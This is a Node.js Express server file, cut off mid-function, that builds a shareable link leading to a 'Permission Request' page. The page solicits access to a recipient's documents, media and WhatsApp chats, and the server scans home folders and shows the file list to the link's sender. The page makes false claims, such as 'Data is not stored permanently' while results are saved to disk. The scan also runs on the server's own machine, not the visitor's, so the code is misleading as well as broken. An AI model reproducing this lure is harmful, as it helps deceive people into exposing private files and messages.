// server.js - Complete Permission-Based File Access System
const express = require('express');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const app = express();
const port = 3000;

// ============================================
// DATA STORAGE
// ============================================

// Store user sessions
const sessions = new Map();
const fileData = new Map(); // Store scanned files temporarily

// ============================================
// MIDDLEWARE
// ============================================

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Create directories
if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');
if (!fs.existsSync('data')) fs.mkdirSync('data');

// ============================================
// GENERATE UNIQUE LINK (User ko bhejne ke liye)
// ============================================

app.get('/generate-link', (req, res) => {
    const token = crypto.randomBytes(32).toString('hex');
    const userId = 'user_' + Date.now();
    
    sessions.set(token, {
        userId: userId,
        status: 'pending', // pending, granted, expired
        createdAt: Date.now(),
        files: [],
        userInfo: null,
        ip: req.ip
    });
    
    const link = `http://${getLocalIP()}:${port}/access/${token}`;
    
    res.json({
        success: true,
        link: link,
        token: token,
        message: 'Share this link with the user'
    });
});

// ============================================
// USER ACCESS PAGE (User ko ye dikhega)
// ============================================

app.get('/access/:token', (req, res) => {
    const token = req.params.token;
    const session = sessions.get(token);
    
    if (!session) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head><title>Invalid Link</title></head>
            <body style="font-family:Arial;text-align:center;padding:50px;">
                <h1>❌ Invalid Link</h1>
                <p>This link is invalid or has expired.</p>
            </body>
            </html>
        `);
    }
    
    if (session.status === 'expired') {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head><title>Link Expired</title></head>
            <body style="font-family:Arial;text-align:center;padding:50px;">
                <h1>⏰ Link Expired</h1>
                <p>This link has expired. Please request a new one.</p>
            </body>
            </html>
        `);
    }
    
    // Show permission page
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Permission Request</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 20px;
                }
                .card {
                    background: white;
                    border-radius: 20px;
                    padding: 40px;
                    max-width: 550px;
                    width: 100%;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                    animation: slideUp 0.5s ease;
                }
                @keyframes slideUp {
                    from { transform: translateY(50px); opacity: 0; }
                    to { transform: translateY(0); opacity: 1; }
                }
                .icon { font-size: 64px; text-align: center; display: block; margin-bottom: 15px; }
                h1 { text-align: center; color: #2d3436; margin-bottom: 10px; }
                .subtitle { text-align: center; color: #636e72; margin-bottom: 30px; }
                .info-box {
                    background: #f8f9fa;
                    border-left: 4px solid #667eea;
                    padding: 15px;
                    margin: 20px 0;
                    border-radius: 5px;
                }
                .info-box h3 { color: #2d3436; margin-bottom: 10px; }
                .info-box ul { list-style: none; padding: 0; }
                .info-box ul li { 
                    padding: 8px 0; 
                    color: #636e72;
                    border-bottom: 1px solid #eee;
                }
                .info-box ul li:last-child { border-bottom: none; }
                .info-box ul li::before { content: "✓ "; color: #00b894; font-weight: bold; }
                .security-badge {
                    background: #ffeaa7;
                    padding: 12px;
                    border-radius: 10px;
                    text-align: center;
                    margin: 20px 0;
                    color: #2d3436;
                    font-size: 14px;
                }
                .btn-grant {
                    background: linear-gradient(135deg, #00b894, #00a86b);
                    color: white;
                    border: none;
                    padding: 16px 30px;
                    border-radius: 12px;
                    font-size: 18px;
                    width: 100%;
                    cursor: pointer;
                    transition: all 0.3s;
                    font-weight: 600;
                }
                .btn-grant:hover {
                    transform: scale(1.02);
                    box-shadow: 0 10px 25px rgba(0,184,148,0.4);
                }
                .btn-grant:disabled {
                    opacity: 0.5;
                    cursor: not-allowed;
                    transform: none;
                }
                .btn-deny {
                    background: #dfe6e9;
                    color: #2d3436;
                    border: none;
                    padding: 14px 30px;
                    border-radius: 12px;
                    font-size: 16px;
                    width: 100%;
                    cursor: pointer;
                    margin-top: 10px;
                    transition: all 0.3s;
                    font-weight: 500;
                }
                .btn-deny:hover { background: #b2bec3; }
                .status-message {
                    padding: 15px;
                    border-radius: 10px;
                    margin: 15px 0;
                    display: none;
                }
                .status-message.success {
                    display: block;
                    background: #d4edda;
                    color: #155724;
                    border: 1px solid #c3e6cb;
                }
                .status-message.error {
                    display: block;
                    background: #f8d7da;
                    color: #721c24;
                    border: 1px solid #f5c6cb;
                }
                .timer {
                    text-align: center;
                    color: #636e72;
                    font-size: 13px;
                    margin-top: 15px;
                }
                .folder-options {
                    margin: 20px 0;
                }
                .folder-option {
                    display: flex;
                    align-items: center;
                    padding: 12px;
                    background: #f8f9fa;
                    margin: 8px 0;
                    border-radius: 10px;
                    cursor: pointer;
                    transition: all 0.3s;
                }
                .folder-option:hover { background: #e9ecef; }
                .folder-option input[type="checkbox"] {
                    margin-right: 15px;
                    width: 18px;
                    height: 18px;
                    cursor: pointer;
                }
                .folder-option label {
                    flex: 1;
                    cursor: pointer;
                    font-weight: 500;
                }
                .folder-option .desc {
                    color: #636e72;
                    font-size: 12px;
                    font-weight: normal;
                }
            </style>
        </head>
        <body>
            <div class="card" id="permissionCard">
                <span class="icon">🔐</span>
                <h1>Permission Request</h1>
                <p class="subtitle">This application wants to access your files</p>

                <div class="security-badge">
                    🔒 <strong>Secure & Encrypted</strong> • Your data is protected
                </div>

                <div class="info-box">
                    <h3>📋 What will be accessed:</h3>
                    <ul>
                        <li>Your documents (PDF, Word, Excel, etc.)</li>
                        <li>Your media files (Images, Videos, Audio)</li>
                        <li>Your WhatsApp data (if available)</li>
                        <li>File information (name, size, path)</li>
                    </ul>
                </div>

                <div class="info-box" style="border-left-color: #e17055;">
                    <h3>⚠️ Important Notes:</h3>
                    <ul>
                        <li>✅ You are in full control</li>
                        <li>⏰ Permission expires in 1 hour</li>
                        <li>🔒 Data is not stored permanently</li>
                        <li>👁️ You can revoke anytime</li>
                        <li>📁 Only selected folders will be accessed</li>
                    </ul>
                </div>

                <div class="folder-options">
                    <h3 style="margin-bottom:15px;">📁 Select what to share:</h3>
                    
                    <div class="folder-option">
                        <input type="checkbox" id="allFiles" checked onchange="toggleAll(this)">
                        <label for="allFiles">
                            <strong>All Files</strong>
                            <div class="desc">Full access to all your files</div>
                        </label>
                    </div>

                    <div class="folder-option">
                        <input type="checkbox" id="documents" checked>
                        <label for="documents">
                            <strong>📝 Documents</strong>
                            <div class="desc">PDF, Word, Excel, PowerPoint, Text files</div>
                        </label>
                    </div>

                    <div class="folder-option">
                        <input type="checkbox" id="media" checked>
                        <label for="media">
                            <strong>🖼️ Media Files</strong>
                            <div class="desc">Images, Videos, Audio files</div>
                        </label>
                    </div>

                    <div class="folder-option">
                        <input type="checkbox" id="whatsapp" checked>
                        <label for="whatsapp">
                            <strong>💬 WhatsApp Data</strong>
                            <div class="desc">WhatsApp chats, media, and backups</div>
                        </label>
                    </div>

                    <div class="folder-option">
                        <input type="checkbox" id="downloads">
                        <label for="downloads">
                            <strong>⬇️ Downloads</strong>
                            <div class="desc">Your Downloads folder</div>
                        </label>
                    </div>
                </div>

                <button class="btn-grant" id="grantBtn" onclick="grantPermission()">
                    ✅ Grant Permission & Continue
                </button>
                
                <button class="btn-deny" onclick="denyPermission()">
                    ❌ Deny Access
                </button>

                <div class="timer">
                    ⏱️ Permission expires in <span id="countdown">60:00</span>
                </div>

                <div id="statusMessage" class="status-message"></div>
            </div>

            <script>
                const token = '${token}';
                let countdown = 3600; // 1 hour in seconds

                // Toggle all checkboxes
                function toggleAll(master) {
                    document.querySelectorAll('.folder-options input[type="checkbox"]').forEach(cb => {
                        if (cb.id !== 'allFiles') {
                            cb.checked = master.checked;
                        }
                    });
                }

                // Grant permission
                async function grantPermission() {
                    const btn = document.getElementById('grantBtn');
                    btn.disabled = true;
                    btn.textContent = '⏳ Processing...';

                    // Get selected folders
                    const selected = [];
                    if (document.getElementById('allFiles').checked) {
                        selected.push('all');
                    } else {
                        if (document.getElementById('documents').checked) selected.push('documents');
                        if (document.getElementById('media').checked) selected.push('media');
                        if (document.getElementById('whatsapp').checked) selected.push('whatsapp');
                        if (document.getElementById('downloads').checked) selected.push('downloads');
                    }

                    try {
                        const response = await fetch('/api/grant-permission', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                token: token,
                                folders: selected 
                            })
                        });

                        const data = await response.json();
                        
                        if (data.success) {
                            showStatus('✅ Permission granted! Your files are being scanned...', 'success');
                            setTimeout(() => {
                                window.location.href = '/status?token=' + token;
                            }, 2000);
                        } else {
                            showStatus('❌ Error: ' + data.message, 'error');
                            btn.disabled = false;
                            btn.textContent = '✅ Grant Permission & Continue';
                        }
                    } catch (error) {
                        showStatus('❌ Error: ' + error.message, 'error');
                        btn.disabled = false;
                        btn.textContent = '✅ Grant Permission & Continue';
                    }
                }

                // Deny permission
                function denyPermission() {
                    if (confirm('Are you sure you want to deny access?')) {
                        window.location.href = '/api/deny-permission?token=' + token;
                    }
                }

                // Show status
                function showStatus(message, type) {
                    const div = document.getElementById('statusMessage');
                    div.className = 'status-message ' + type;
                    div.textContent = message;
                }

                // Countdown timer
                function startCountdown() {
                    const timer = setInterval(() => {
                        countdown--;
                        const mins = Math.floor(countdown / 60);
                        const secs = countdown % 60;
                        document.getElementById('countdown').textContent = 
                            String(mins).padStart(2,'0') + ':' + String(secs).padStart(2,'0');
                        
                        if (countdown <= 0) {
                            clearInterval(timer);
                            document.getElementById('grantBtn').disabled = true;
                            document.getElementById('grantBtn').textContent = '⏰ Permission Expired';
                            showStatus('⏰ Permission has expired. Please request a new link.', 'error');
                        }
                    }, 1000);
                }

                startCountdown();
            </script>
        </body>
        </html>
    `);
});

// ============================================
// PERMISSION GRANT API
// ============================================

app.post('/api/grant-permission', (req, res) => {
    const { token, folders } = req.body;
    const session = sessions.get(token);
    
    if (!session) {
        return res.json({ success: false, message: 'Invalid session' });
    }
    
    session.status = 'granted';
    session.grantedAt = Date.now();
    session.folders = folders;
    session.userInfo = {
        ip: req.ip,
        userAgent: req.headers['user-agent']
    };
    
    sessions.set(token, session);
    
    // Start scanning in background
    scanUserFiles(token);
    
    res.json({ 
        success: true, 
        message: 'Permission granted successfully',
        token: token
    });
});

// ============================================
// SCAN USER FILES (Background process)
// ============================================

async function scanUserFiles(token) {
    const session = sessions.get(token);
    if (!session || session.status !== 'granted') return;
    
    try {
        const homeDir = os.homedir();
        const files = [];
        const foldersToScan = [];
        
        // Determine which folders to scan
        if (session.folders.includes('all')) {
            foldersToScan.push(homeDir);
        } else {
            if (session.folders.includes('documents')) {
                foldersToScan.push(path.join(homeDir, 'Documents'));
            }
            if (session.folders.includes('media')) {
                foldersToScan.push(path.join(homeDir, 'Pictures'));
                foldersToScan.push(path.join(homeDir, 'Videos'));
                foldersToScan.push(path.join(homeDir, 'Music'));
            }
            if (session.folders.includes('whatsapp')) {
                const waPaths = [
                    path.join(homeDir, 'AppData', 'Roaming', 'WhatsApp'),
                    path.join(homeDir, 'Documents', 'WhatsApp'),
                    path.join(homeDir, 'Downloads', 'WhatsApp')
                ];
                waPaths.forEach(p => {
                    if (fs.existsSync(p)) foldersToScan.push(p);
                });
            }
            if (session.folders.includes('downloads')) {
                foldersToScan.push(path.join(homeDir, 'Downloads'));
            }
        }
        
        // Scan each folder
        foldersToScan.forEach(dir => {
            if (fs.existsSync(dir)) {
                scanDirectory(dir, files, 0, 5);
            }
        });
        
        // Store files
        session.files = files;
        session.scanComplete = true;
        session.scanTime = Date.now();
        sessions.set(token, session);
        
        // Save to file for persistence
        fs.writeFileSync(`data/${token}.json`, JSON.stringify({
            token: token,
            files: files,
            stats: getStats(files),
            timestamp: new Date().toISOString()
        }, null, 2));
        
        console.log(`✅ Scan complete for ${token}: ${files.length} files found`);
        
    } catch (err) {
        console.error('Scan error:', err);
        session.error = err.message;
        sessions.set(token, session);
    }
}

// Scan directory helper
function scanDirectory(dirPath, files, depth = 0, maxDepth = 5) {
    if (depth > maxDepth) return;
    
    try {
        const items = fs.readdirSync(dirPath);
        
        for (const item of items) {
            try {
                const fullPath = path.join(dirPath, item);
                const stats = fs.statSync(fullPath);
                
                // Skip system folders
                const skip = ['System Volume Information', '$Recycle.Bin', 'Windows', 
                            'Program Files', 'Program Files (x86)', 'AppData/Local/Temp'];
                if (skip.some(s => fullPath.includes(s))) continue;
                
                if (stats.isDirectory()) {
                    scanDirectory(fullPath, files, depth + 1, maxDepth);
                } else {
                    // Limit file size to 10MB for scanning
                    if (stats.size > 10 * 1024 * 1024) continue;
                    
                    files.push({
                        name: item,
                        path: fullPath,
                        size: stats.size,
                        extension: path.extname(item).toLowerCase(),
                        modified: stats.mtime,
                        created: stats.birthtime,
                        isDirectory: false
                    });
                }
            } catch (e) {
                // Skip inaccessible
            }
        }
    } catch (e) {
        // Skip inaccessible
    }
}

// Get statistics
function getStats(files) {
    let totalSize = 0;
    let whatsappFiles = 0;
    let docFiles = 0;
    let mediaFiles = 0;
    
    files.forEach(f => {
        totalSize += f.size;
        const name = f.name.toLowerCase();
        
        if (name.includes('whatsapp') || name.includes('wa_')) {
            whatsappFiles++;
        }
        
        const docExts = ['.pdf','.doc','.docx','.txt','.xls','.xlsx','.ppt','.pptx'];
        if (docExts.includes(f.extension)) {
            docFiles++;
        }
        
        const mediaExts = ['.jpg','.jpeg','.png','.gif','.bmp','.mp4','.mkv','.mp3','.wav'];
        if (mediaExts.includes(f.extension)) {
            mediaFiles++;
        }
    });
    
    return {
        totalFiles: files.length,
        totalSize: (totalSize / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
        whatsappFiles: whatsappFiles,
        docFiles: docFiles,
        mediaFiles: mediaFiles
    };
}

// ============================================
// STATUS PAGE (User ko scan status dikhe)
// ============================================

app.get('/status', (req, res) => {
    const token = req.query.token;
    const session = sessions.get(token);
    
    if (!session) {
        return res.send('<h1>❌ Invalid Session</h1>');
    }
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Scan Status</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: 'Segoe UI', sans-serif; background: #f5f6fa; padding: 20px; }
                .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 30px rgba(0,0,0,0.1); }
                .icon { font-size: 48px; text-align: center; display: block; }
                h1 { text-align: center; color: #2d3436; }
                .status { text-align: center; padding: 20px; }
                .loading { display: inline-block; width: 40px; height: 40px; border: 4px solid #dfe6e9; border-top-color: #6c5ce7; border-radius: 50%; animation: spin 1s linear infinite; }
                @keyframes spin { to { transform: rotate(360deg); } }
                .info { background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 15px 0; }
                .info-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; }
                .info-item:last-child { border-bottom: none; }
                .badge { display: inline-block; padding: 3px 12px; border-radius: 12px; font-size: 12px; }
                .badge-success { background: #d4edda; color: #155724; }
                .badge-warning { background: #ffeaa7; color: #856404; }
                .btn { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; }
                .btn-primary { background: #6c5ce7; color: white; }
                .btn-danger { background: #e17055; color: white; }
                .btn-success { background: #00b894; color: white; }
                .btn-secondary { background: #dfe6e9; color: #2d3436; }
            </style>
        </head>
        <body>
            <div class="container">
                <span class="icon">📊</span>
                <h1>File Scan Status</h1>
                <div class="status">
                    ${session.scanComplete ? '✅ Scan Complete!' : '<div class="loading"></div><p>Scanning your files...</p>'}
                </div>
                
                <div class="info">
                    <div class="info-item">
                        <span>📄 Total Files</span>
                        <span>${session.files ? session.files.length : 'Scanning...'}</span>
                    </div>
                    <div class="info-item">
                        <span>💾 Total Size</span>
                        <span>${session.files ? (session.files.reduce((s,f) => s + f.size, 0) / (1024*1024*1024)).toFixed(2) + ' GB' : '...'}</span>
                    </div>
                    <div class="info-item">
                        <span>💬 WhatsApp Files</span>
                        <span>${session.files ? session.files.filter(f => f.name.toLowerCase().includes('whatsapp')).length : '...'}</span>
                    </div>
                    <div class="info-item">
                        <span>🖼️ Media Files</span>
                        <span>${session.files ? session.files.filter(f => ['.jpg','.png','.gif','.mp4','.mp3'].includes(f.extension)).length : '...'}</span>
                    </div>
                    <div class="info-item">
                        <span>📝 Documents</span>
                        <span>${session.files ? session.files.filter(f => ['.pdf','.doc','.docx','.txt'].includes(f.extension)).length : '...'}</span>
                    </div>
                </div>

                <div style="text-align:center;margin-top:20px;">
                    <span class="badge ${session.scanComplete ? 'badge-success' : 'badge-warning'}">
                        ${session.scanComplete ? '✅ Access Granted' : '⏳ Processing...'}
                    </span>
                </div>

                <div style="margin-top:20px;display:flex;gap:10px;">
                    <button class="btn btn-success" onclick="window.location.href='/view-files?token=${token}'">
                        📂 View Files
                    </button>
                    <button class="btn btn-danger" onclick="revokePermission()">
                        🔒 Revoke Access
                    </button>
                </div>

                <p style="text-align:center;color:#636e72;font-size:12px;margin-top:15px;">
                    Permission expires in <span id="countdown">60:00</span>
                </p>
            </div>

            <script>
                let countdown = 3600;
                setInterval(() => {
                    countdown--;
                    const mins = Math.floor(countdown/60);
                    const secs = countdown%60;
                    document.getElementById('countdown').textContent = 
                        String(mins).padStart(2,'0') + ':' + String(secs).padStart(2,'0');
                    if (countdown <= 0) {
                        alert('Permission expired. You will be redirected.');
                        window.location.href = '/';
                    }
                }, 1000);

                function revokePermission() {
                    if (confirm('Are you sure you want to revoke access?')) {
                        window.location.href = '/api/revoke?token=${token}';
                    }
                }

                // Auto-refresh status
                setTimeout(() => {
                    location.reload();
                }, 5000);
            </script>
        </body>
        </html>
    `);
});

// ============================================
// VIEW FILES (Aap ko files dikhein)
// ============================================

app.get('/view-files', (req, res) => {
    const token = req.query.token;
    const session = sessions.get(token);
    
    if (!session || session.status !== 'granted') {
        return res.send('<h1>❌ Access Denied</h1>');
    }
    
    if (!session.scanComplete) {
        return res.send(`
            <h1>⏳ Scanning in progress...</h1>
            <p>Please wait while your files are being scanned.</p>
            <meta http-equiv="refresh" content="3">
        `);
    }
    
    const files = session.files || [];
    const stats = getStats(files);
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Your Files</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: 'Segoe UI', sans-serif; background: #f5f6fa; padding: 20px; }
                .container { max-width: 1200px; margin: auto; }
                .header {
                    background: linear-gradient(135deg, #667eea, #764ba2);
                    color: white;
                    padding: 25px;
                    border-radius: 15px;
                    margin-bottom: 25px;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    flex-wrap: wrap;
                }
                .header h1 { font-size: 28px; }
                .header .sub { opacity: 0.8; font-size: 14px; }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                    gap: 15px;
                    margin-bottom: 25px;
                }
                .stat-card {
                    background: white;
                    padding: 15px;
                    border-radius: 10px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                    text-align: center;
                }
                .stat-card .num { font-size: 24px; font-weight: bold; color: #2d3436; }
                .stat-card .label { color: #636e72; font-size: 12px; }
                .controls {
                    background: white;
                    padding: 15px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                    display: flex;
                    gap: 10px;
                    flex-wrap: wrap;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                }
                .controls input {
                    flex: 1;
                    padding: 10px;
                    border: 1px solid #dfe6e9;
                    border-radius: 8px;
                    font-size: 14px;
                    min-width: 200px;
                }
                .controls button {
                    padding: 10px 20px;
                    border: none;
                    border-radius: 8px;
                    cursor: pointer;
                    font-weight: 500;
                }
                .btn-primary { background: #6c5ce7; color: white; }
                .btn-success { background: #00b894; color: white; }
                .btn-danger { background: #e17055; color: white; }
                .btn-secondary { background: #dfe6e9; color: #2d3436; }
                .file-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
                    gap: 10px;
                }
                .file-item {
                    background: white;
                    padding: 12px;
                    border-radius: 8px;
                    border: 1px solid #dfe6e9;
                    cursor: pointer;
                    transition: all 0.3s;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.05);
                }
                .file-item:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                    border-color: #6c5ce7;
                }
                .file-item .name { font-weight: 500; color: #2d3436; }
                .file-item .meta { font-size: 12px; color: #636e72; margin-top: 5px; }
                .file-item .badge {
                    display: inline-block;
                    padding: 2px 10px;
                    border-radius: 12px;
                    font-size: 10px;
                    font-weight: bold;
                    margin-top: 5px;
                }
                .badge-whatsapp { background: #25D366; color: white; }
                .badge-doc { background: #3498db; color: white; }
                .badge-media { background: #e74c3c; color: white; }
                .badge-code { background: #f39c12; color: white; }
                .modal {
                    display: none;
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0,0,0,0.8);
                    z-index: 1000;
                    padding: 20px;
                }
                .modal-content {
                    background: white;
                    max-width: 800px;
                    margin: 50px auto;
                    padding: 25px;
                    border-radius: 15px;
                    max-height: 80vh;
                    overflow-y: auto;
                }
                .modal-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 15px;
                }
                .modal-close {
                    background: none;
                    border: none;
                    font-size: 28px;
                    cursor: pointer;
                }
                .modal-body {
                    font-family: 'Courier New', monospace;
                    font-size: 14px;
                    white-space: pre-wrap;
                    word-break: break-all;
                    background: #f8f9fa;
                    padding: 15px;
                    border-radius: 8px;
                    max-height: 50vh;
                    overflow-y: auto;
                }
                .empty-state {
                    text-align: center;
                    padding: 50px;
                    color: #636e72;
                }
                .empty-state .icon { font-size: 48px; display: block; margin-bottom: 15px; }
                .toast {
                    position: fixed;
                    bottom: 20px;
                    right: 20px;
                    padding: 15px 25px;
                    border-radius: 10px;
                    color: white;
                    animation: slideIn 0.5s ease;
                    z-index: 999;
                }
                .toast.success { background: #00b894; }
                .toast.error { background: #e17055; }
                .toast.info { background: #6c5ce7; }
                @keyframes slideIn {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                .pagination {
                    text-align: center;
                    margin-top: 20px;
                }
                .pagination button {
                    padding: 8px 15px;
                    margin: 0 5px;
                    border: 1px solid #dfe6e9;
                    border-radius: 5px;
                    background: white;
                    cursor: pointer;
                }
                .pagination button.active {
                    background: #6c5ce7;
                    color: white;
                    border-color: #6c5ce7;
                }
                .file-path {
                    font-size: 11px;
                    color: #888;
                    word-break: break-all;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div>
                        <h1>📂 User Files</h1>
                        <div class="sub">Files shared by ${session.userId}</div>
                    </div>
                    <div>
                        <span style="background:rgba(255,255,255,0.2);padding:8px 15px;border-radius:20px;font-size:14px;">
                            ✅ ${files.length} files
                        </span>
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="num">${stats.totalFiles}</div>
                        <div class="label">📄 Total Files</div>
                    </div>
                    <div class="stat-card">
                        <div class="num">${stats.totalSize}</div>
                        <div class="label">💾 Total Size</div>
                    </div>
                    <div class="stat-card">
                        <div class="num">${stats.whatsappFiles}</div>
                        <div class="label">💬 WhatsApp</div>
                    </div>
                    <div class="stat-card">
                        <div class="num">${stats.docFiles}</div>
                        <div class="label">📝 Documents</div>
                    </div>
                    <div class="stat-card">
                        <div class="num">${stats.mediaFiles}</div>
                        <div class="label">🖼️ Media</div>
                    </div>
                </div>

                <div class="controls">
                    <input type="text" id="searchInput" placeholder="🔍 Search files..." oninput="searchFiles(this.value)">
                    <select id="filterSelect" onchange="filterFiles(this.value)">
                        <option value="all">All Files</option>
                        <option value="whatsapp">💬 WhatsApp</option>
                        <option value="documents">📝 Documents</option>
                        <option value="media">🖼️ Media</option>
                        <option value="large">📦 Large (>10MB)</option>
                    </select>
                    <button class="btn-primary" onclick="exportData()">📤 Export JSON</button>
                    <button class="btn-danger" onclick="revokeAccess()">🔒 Revoke</button>
                </div>

                <div id="fileList" class="file-grid">
                    ${files.length === 0 ? `
                        <div class="empty-state" style="grid-column:1/-1;">
                            <span class="icon">📭</span>
                            <p>No files found</p>
                        </div>
                    ` : ''}
                </div>

                <div class="pagination" id="pagination"></div>
            </div>

            <!-- Modal -->
            <div class="modal" id="fileModal">
                <div class="modal-content">
                    <div class="modal-header">
                        <h2 id="modalTitle">File Content</h2>
                        <button class="modal-close" onclick="closeModal()">✕</button>
                    </div>
                    <div class="modal-body" id="modalBody">Loading...</div>
                    <div style="margin-top:15px;display:flex;gap:10px;">
                        <button class="btn btn-primary" onclick="downloadFile()">⬇️ Download</button>
                        <button class="btn btn-secondary" onclick="copyContent()">📋 Copy</button>
                    </div>
                </div>
            </div>

            <script>
                let allFiles = ${JSON.stringify(files)};
                let currentFiles = [...allFiles];
                let currentPage = 1;
                const pageSize = 50;
                let selectedFile = null;

                // Display files
                function displayFiles(files) {
                    const container = document.getElementById('fileList');
                    
                    if (files.length === 0) {
                        container.innerHTML = \`
                            <div class="empty-state" style="grid-column:1/-1;">
                                <span class="icon">🔍</span>
                                <p>No files match your search</p>
                            </div>
                        \`;
                        return;
                    }

                    const start = (currentPage - 1) * pageSize;
                    const end = Math.min(start + pageSize, files.length);
                    const pageFiles = files.slice(start, end);

                    let html = '';
                    pageFiles.forEach((file, index) => {
                        const badge = getBadge(file);
                        const size = formatSize(file.size);
                        const icon = getFileIcon(file.extension);
                        
                        html += \`
                            <div class="file-item" onclick="previewFile(\${allFiles.indexOf(file)})">
                                <div class="name">\${icon} \${file.name}</div>
                                <div class="meta">\${size}</div>
                                \${badge}
                                <div class="file-path">\${file.path}</div>
                            </div>
                        \`;
                    });

                    container.innerHTML = html;
                    updatePagination(files.length);
                }

                // Get badge
                function getBadge(file) {
                    const name = file.name.toLowerCase();
                    const ext = file.extension;
                    
                    if (name.includes('whatsapp') || name.includes('wa_')) {
                        return '<span class="badge badge-whatsapp">💬 WhatsApp</span>';
                    }
                    if (['.pdf','.doc','.docx','.txt','.xls','.xlsx','.ppt','.pptx'].includes(ext)) {
                        return '<span class="badge badge-doc">📝 Doc</span>';
                    }
                    if (['.jpg','.jpeg','.png','.gif','.bmp','.mp4','.mp3'].includes(ext)) {
                        return '<span class="badge badge-media">🖼️ Media</span>';
                    }
                    return '';
                }

                // Get file icon
                function getFileIcon(ext) {
                    const icons = {
                        '.txt': '📄', '.js': '🟨', '.html': '🟦', '.css': '🟪',
                        '.json': '📋', '.xml': '📋', '.csv': '📊', '.md': '📝',
                        '.pdf': '📕', '.doc': '📘', '.docx': '📘', '.xls': '📗',
                        '.xlsx': '📗', '.ppt': '📙', '.pptx': '📙',
                        '.jpg': '🖼️', '.jpeg': '🖼️', '.png': '🖼️', '.gif': '🖼️',
                        '.mp4': '🎬', '.mp3': '🎵', '.wav': '🎵',
                        '.zip': '📦', '.rar': '📦'
                    };
                    return icons[ext] || '📄';
                }

                // Format size
                function formatSize(bytes) {
                    if (bytes < 1024) return bytes + ' B';
                    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
                    if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
                    return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
                }

                // Search files
                function searchFiles(query) {
                    if (!query) {
                        currentFiles = [...allFiles];
                    } else {
                        const q = query.toLowerCase();
                        currentFiles = allFiles.filter(f => 
                            f.name.toLowerCase().includes(q) || 
                            f.path.toLowerCase().includes(q)
                        );
                    }
                    currentPage = 1;
                    displayFiles(currentFiles);
                }

                // Filter files
                function filterFiles(filter) {
                    let filtered = [...allFiles];
                    
                    switch(filter) {
                        case 'whatsapp':
                            filtered = filtered.filter(f => 
                                f.name.toLowerCase().includes('whatsapp') || 
                                f.path.toLowerCase().includes('whatsapp')
                            );
                            break;
                        case 'documents':
                            const docExts = ['.pdf','.doc','.docx','.txt','.xls','.xlsx','.ppt','.pptx'];
                            filtered = filtered.filter(f => docExts.includes(f.extension));
                            break;
                        case 'media':
                            const mediaExts = ['.jpg','.jpeg','.png','.gif','.bmp','.mp4','.mkv','.mp3','.wav'];
                            filtered = filtered.filter(f => mediaExts.includes(f.extension));
                            break;
                        case 'large':
                            filtered = filtered.filter(f => f.size > 10 * 1024 * 1024);
                            break;
                        default:
                            // All files
                    }
                    
                    // Apply search
                    const searchQuery = document.getElementById('searchInput').value;
                    if (searchQuery) {
                        const q = searchQuery.toLowerCase();
                        filtered = filtered.filter(f => 
                            f.name.toLowerCase().includes(q) || 
                            f.path.toLowerCase().includes(q)
                        );
                    }
                    
                    currentFiles = filtered;
                    currentPage = 1;
                    displayFiles(currentFiles);
                }

                // Update pagination
                function updatePagination(total) {
                    const pages = Math.ceil(total / pageSize);
                    const container = document.getElementById('pagination');
                    
                    if (pages <= 1) {
                        container.innerHTML = '';
                        return;
                    }
                    
                    let html = '';
                    for (let i = 1; i <= pages; i++) {
                        html += \`
                            <button class="\${i === currentPage ? 'active' : ''}" onclick="goToPage(\${i})">
                                \${i}
                            </button>
                        \`;
                    }
                    container.innerHTML = html;
                }

                // Go to page
                function goToPage(page) {
                    currentPage = page;
                    displayFiles(currentFiles);
                }

                // Preview file
                async function previewFile(index) {
                    const file = allFiles[index];
                    if (!file) return;
                    
                    selectedFile = file;
                    document.getElementById('modalTitle').textContent = '📄 ' + file.name;
                    document.getElementById('modalBody').textContent = 'Loading...';
                    document.getElementById('fileModal').style.display = 'block';
                    
                    try {
